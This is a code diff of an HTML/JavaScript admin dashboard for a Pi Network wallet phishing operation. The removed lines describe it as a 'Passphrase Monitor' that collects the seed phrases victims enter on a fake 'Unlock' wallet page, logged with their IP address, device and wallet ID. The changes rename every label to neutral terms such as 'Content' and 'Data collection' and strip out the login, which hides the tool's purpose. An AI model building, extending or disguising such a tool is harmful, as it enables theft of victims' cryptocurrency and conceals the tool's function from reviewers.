@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-<title>Pi Network Admin Panel</title>
+<title>System Control Dashboard</title>
 <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap"/>
 <style>
   * { box-sizing: border-box; margin: 0; padding: 0; }
@@ -13,93 +13,6 @@
     color: #1f2937;
     min-height: 100vh;
   }
-
-  /* ---------- LOGIN ---------- */
-  #loginWrap {
-    min-height: 100vh;
-    display: flex;
-    align-items: center;
-    justify-content: center;
-    background: linear-gradient(135deg, #783A8D 0%, #4b1e5c 100%);
-    padding: 20px;
-  }
-  .login-card {
-    background: #fff;
-    padding: 40px 36px;
-    border-radius: 18px;
-    box-shadow: 0 25px 60px rgba(0,0,0,0.25);
-    width: 100%;
-    max-width: 420px;
-  }
-  .login-logo {
-    text-align: center;
-    margin-bottom: 28px;
-  }
-  .login-logo h1 {
-    color: #783A8D;
-    font-size: 26px;
-    font-weight: 700;
-    margin-top: 10px;
-  }
-  .login-logo p {
-    color: #6b7280;
-    font-size: 13px;
-    margin-top: 4px;
-  }
-  .field { margin-bottom: 18px; }
-  .field label {
-    display: block;
-    font-size: 13px;
-    font-weight: 600;
-    color: #374151;
-    margin-bottom: 6px;
-  }
-  .field input {
-    width: 100%;
-    padding: 13px 15px;
-    border: 1.5px solid #e5e7eb;
-    border-radius: 10px;
-    font-size: 14px;
-    font-family: inherit;
-    transition: all 0.2s;
-    outline: none;
-  }
-  .field input:focus {
-    border-color: #783A8D;
-    box-shadow: 0 0 0 3px rgba(120,58,141,0.12);
-  }
-  .login-btn {
-    width: 100%;
-    padding: 14px;
-    background: linear-gradient(135deg, #783A8D, #4b1e5c);
-    color: #fff;
-    border: none;
-    border-radius: 10px;
-    font-size: 14px;
-    font-weight: 600;
-    font-family: inherit;
-    cursor: pointer;
-    transition: transform 0.15s, box-shadow 0.2s;
-    letter-spacing: 0.5px;
-  }
-  .login-btn:hover:not(:disabled) {
-    transform: translateY(-1px);
-    box-shadow: 0 10px 20px rgba(120,58,141,0.35);
-  }
-  .login-btn:disabled { opacity: 0.6; cursor: not-allowed; }
-  .err {
-    background: #fee2e2;
-    color: #b91c1c;
-    padding: 10px 12px;
-    border-radius: 8px;
-    font-size: 13px;
-    margin-bottom: 16px;
-    display: none;
-  }
-  .err.show { display: block; }
-
-  /* ---------- DASHBOARD ---------- */
-  #dashWrap { display: none; }
 
   .topbar {
     background: #fff;
@@ -155,14 +68,6 @@
   .icon-btn:hover {
     background: #f9fafb;
     border-color: #d1d5db;
-  }
-  .icon-btn.danger {
-    background: #fef2f2;
-    border-color: #fecaca;
-    color: #b91c1c;
-  }
-  .icon-btn.danger:hover {
-    background: #fee2e2;
   }
 
   .main {
@@ -461,51 +366,29 @@
 </head>
 <body>
 
-<!-- ===================== LOGIN ===================== -->
-<div id="loginWrap">
-  <div class="login-card">
-    <div class="login-logo">
-      <div style="width:58px;height:58px;margin:0 auto;border-radius:50%;background:linear-gradient(135deg,#783A8D,#4b1e5c);color:#fff;display:flex;align-items:center;justify-content:center;font-size:26px;font-weight:700;">π</div>
-      <h1>Admin Panel</h1>
-      <p>Pi Network · Passphrase Monitor</p>
-    </div>
-    <div class="err" id="loginErr">Invalid username or password</div>
-    <div class="field">
-      <label for="u">Username</label>
-      <input type="text" id="u" autocomplete="username" placeholder="admin"/>
-    </div>
-    <div class="field">
-      <label for="p">Password</label>
-      <input type="password" id="p" autocomplete="current-password" placeholder="Enter password"/>
-    </div>
-    <button class="login-btn" id="loginBtn" onclick="login()">SIGN IN</button>
-  </div>
-</div>
-
 <!-- ===================== DASHBOARD ===================== -->
 <div id="dashWrap">
   <div class="topbar">
     <div class="brand">
       <div class="brand-badge">π</div>
       <div>
-        <h2>Admin Dashboard</h2>
-        <span>Passphrase collection &amp; monitor</span>
+        <h2>Operations Dashboard</h2>
+        <span>Data collection &amp; monitoring</span>
       </div>
     </div>
     <div class="topbar-actions">
       <button class="icon-btn" onclick="loadAll(true)">↻ Refresh</button>
-      <button class="icon-btn danger" onclick="logout()">⎋ Logout</button>
     </div>
   </div>
 
   <div class="main">
     <div class="stats-row">
       <div class="stat-card purple">
-        <div class="label">Total Submissions</div>
+        <div class="label">Total Entries</div>
         <div class="value" id="sTotal">—</div>
       </div>
       <div class="stat-card green">
-        <div class="label">24-Word Phrases</div>
+        <div class="label">24-Word Sets</div>
         <div class="value" id="s24">—</div>
       </div>
       <div class="stat-card amber">
@@ -513,14 +396,14 @@
         <div class="value" id="sFlag">—</div>
       </div>
       <div class="stat-card">
-        <div class="label">New (unviewed)</div>
+        <div class="label">New (unreviewed)</div>
         <div class="value" id="sNew">—</div>
       </div>
     </div>
 
     <div class="toolbar">
       <div class="search">
-        <input type="text" id="searchInput" placeholder="Search passphrase, IP, user agent..." oninput="render()"/>
+        <input type="text" id="searchInput" placeholder="Search content, IP, device info..." oninput="render()"/>
       </div>
       <button class="pill active" data-filter="all" onclick="setFilter('all', this)">All</button>
       <button class="pill" data-filter="24" onclick="setFilter('24', this)">24 words</button>
@@ -533,10 +416,10 @@
         <thead>
           <tr>
             <th style="width:60px">#</th>
-            <th style="min-width:340px">Passphrase</th>
+            <th style="min-width:340px">Content</th>
             <th>IP Address</th>
-            <th style="min-width:220px">User Agent / Device</th>
-            <th>Submitted</th>
+            <th style="min-width:220px">Device / Agent</th>
+            <th>Timestamp</th>
             <th>Status</th>
             <th style="width:180px">Actions</th>
           </tr>
@@ -544,8 +427,8 @@
         <tbody id="tbody"></tbody>
       </table>
       <div class="empty" id="emptyState" style="display:none">
-        <h3>📭 No passphrases yet</h3>
-        <p>Submissions will appear here as users click Unlock on the wallet page.</p>
+        <h3>📭 No data yet</h3>
+        <p>Records will appear here as submissions are received.</p>
       </div>
     </div>
   </div>
@@ -555,7 +438,7 @@
 <div class="modal-backdrop" id="modal">
   <div class="modal">
     <div class="modal-head">
-      <h3>Submission Details</h3>
+      <h3>Record Details</h3>
       <button class="modal-close" onclick="closeModal()">×</button>
     </div>
     <div class="modal-body" id="modalBody"></div>
@@ -565,65 +448,9 @@
 <div class="toast" id="toast">Copied!</div>
 
 <script>
-const TOKEN_KEY = 'pi_admin_token';
 let allRecords = [];
 let currentFilter = 'all';
 let loadPromise = null;
-
-/* ---------- AUTH ---------- */
-function getToken() { return localStorage.getItem(TOKEN_KEY); }
-function setToken(t) { localStorage.setItem(TOKEN_KEY, t); }
-function clearToken() { localStorage.removeItem(TOKEN_KEY); }
-
-function showDashboard() {
-  document.getElementById('loginWrap').style.display = 'none';
-  document.getElementById('dashWrap').style.display = 'block';
-  loadAll();
-}
-
-function showLogin() {
-  document.getElementById('loginWrap').style.display = 'flex';
-  document.getElementById('dashWrap').style.display = 'none';
-}
-
-async function login() {
-  const u = document.getElementById('u').value.trim();
-  const p = document.getElementById('p').value;
-  const btn = document.getElementById('loginBtn');
-  const err = document.getElementById('loginErr');
-  err.classList.remove('show');
-  if (!u || !p) { err.classList.add('show'); return; }
-
-  btn.disabled = true; btn.textContent = 'Signing in...';
-  try {
-    const r = await fetch('/api/admin/login', {
-      method: 'POST',
-      headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ username: u, password: p })
-    });
-    const data = await r.json();
-    if (r.ok && data.token) {
-      setToken(data.token);
-      showDashboard();
-    } else {
-      err.classList.add('show');
-    }
-  } catch (e) {
-    err.classList.add('show');
-  }
-  btn.disabled = false; btn.textContent = 'SIGN IN';
-}
-
-async function logout() {
-  try {
-    await fetch('/api/admin/logout', {
-      method: 'POST',
-      headers: { 'x-admin-token': getToken() || '' }
-    });
-  } catch(_) {}
-  clearToken();
-  showLogin();
-}
 
 /* ---------- API HELPERS ---------- */
 async function api(path, opts = {}) {
@@ -631,15 +458,9 @@ async function api(path, opts = {}) {
     ...opts,
     headers: {
       'Content-Type': 'application/json',
-      'x-admin-token': getToken() || '',
       ...(opts.headers || {})
     }
   });
-  if (res.status === 401) {
-    clearToken();
-    showLogin();
-    throw new Error('Unauthorized');
-  }
   return await res.json();
 }
 
@@ -721,7 +542,7 @@ function render() {
   if (filtered.length === 0) {
     tbody.innerHTML = '';
     empty.style.display = 'block';
-    empty.querySelector('h3').textContent = allRecords.length === 0 ? '📭 No passphrases yet' : '🔍 No matching results';
+    empty.querySelector('h3').textContent = allRecords.length === 0 ? '📭 No data yet' : '🔍 No matching results';
     return;
   }
   empty.style.display = 'none';
@@ -730,7 +551,7 @@ function render() {
     const status = [];
     if (r.flagged) status.push('<span class="badge flagged">🚩 Flagged</span>');
     if (!r.viewed) status.push('<span class="badge new">🆕 New</span>');
-    else status.push('<span class="badge viewed">✓ Viewed</span>');
+    else status.push('<span class="badge viewed">✓ Reviewed</span>');
 
     return `
       <tr>
@@ -813,7 +634,7 @@ async function toggleFlag(id, flagged) {
 }
 
 async function deleteRow(id) {
-  if (!confirm('Delete this submission permanently?')) return;
+  if (!confirm('Delete this record permanently?')) return;
   try {
     await api('/api/admin/passphrases/' + id, { method: 'DELETE' });
     allRecords = allRecords.filter(x => x.id !== id);
@@ -838,7 +659,7 @@ function openDetails(id) {
     <div class="kv-row"><div class="kv-k">ID</div><div class="kv-v">${escapeHtml(r.id)}</div></div>
     <div class="kv-row"><div class="kv-k">Word Count</div><div class="kv-v">${r.wordCount}</div></div>
     <div class="kv-row">
-      <div class="kv-k">Passphrase (${words.length} words)</div>
+      <div class="kv-k">Words (${words.length})</div>
       <div class="kv-v normal">
         ${grid}
         <div style="margin-top:14px">
@@ -850,7 +671,7 @@ function openDetails(id) {
     <div class="kv-row"><div class="kv-k">Submitted At</div><div class="kv-v normal">${r.createdAt ? new Date(r.createdAt).toLocaleString() : '—'}</div></div>
     <div class="kv-row"><div class="kv-k">Wallet ID</div><div class="kv-v">${escapeHtml(r.walletId || '—')}</div></div>
     <div class="kv-row"><div class="kv-k">Source Page</div><div class="kv-v normal">${escapeHtml(r.page || '—')}</div></div>
-    <div class="kv-row"><div class="kv-k">Viewed</div><div class="kv-v normal">${r.viewed ? 'Yes' : 'No'}</div></div>
+    <div class="kv-row"><div class="kv-k">Reviewed</div><div class="kv-v normal">${r.viewed ? 'Yes' : 'No'}</div></div>
     <div class="kv-row"><div class="kv-k">Flagged</div><div class="kv-v normal">${r.flagged ? '🚩 Yes' : 'No'}</div></div>
     <div class="kv-row">
       <div class="kv-k">User Agent</div>
@@ -868,18 +689,7 @@ document.getElementById('modal').addEventListener('click', e => {
 });
 
 /* ---------- BOOT ---------- */
-if (getToken()) {
-  showDashboard();
-} else {
-  showLogin();
-}
-
-document.getElementById('p').addEventListener('keydown', e => {
-  if (e.key === 'Enter') login();
-});
-document.getElementById('u').addEventListener('keydown', e => {
-  if (e.key === 'Enter') document.getElementById('p').focus();
-});
+loadAll();
 </script>
 </body>
 </html>
